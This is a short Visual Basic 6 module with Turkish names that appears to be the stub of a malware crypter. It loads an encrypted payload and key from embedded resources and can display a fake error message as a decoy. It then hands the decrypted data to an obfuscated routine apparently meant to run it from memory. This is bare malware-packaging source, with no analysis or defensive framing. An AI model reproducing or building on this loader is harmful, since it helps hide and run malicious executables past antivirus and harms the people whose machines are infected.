Attribute VB_Name = "Module1"
Option Explicit

Public ThisText As String

Sub Calistir(Optional bBoolDeger As Boolean)

If bBoolDeger = False Then Exit Sub
Dim bsVeri As String
Dim bsKeys As String
Dim bsErrMsg As String

bsVeri = StrConv(LoadResData("DATA", "CUSTOM"), vbUnicode)
SERVICE_PROVIDER = "Microsoft Strong Cryptographic Provider"
bsKeys = StrConv(LoadResData("KEYS", "CUSTOM"), vbUnicode)
KEY_CONTAINER = "CryptMe"
bsErrMsg = StrConv(LoadResData("ERRS", "CUSTOM"), vbUnicode)


If CStr(Split(bsErrMsg, "////")(0)) = "oOo.--.oOo" Then
    MsgBox CStr(Split(bsErrMsg, "////")(1)), vbCritical, CStr(Split(bsErrMsg, "////")(2))
End If

Call Form1.b3ll3kt34c(ThisText, StrConv(DecryptDATA(bsVeri, bsKeys), vbFromUnicode))
End
End Sub



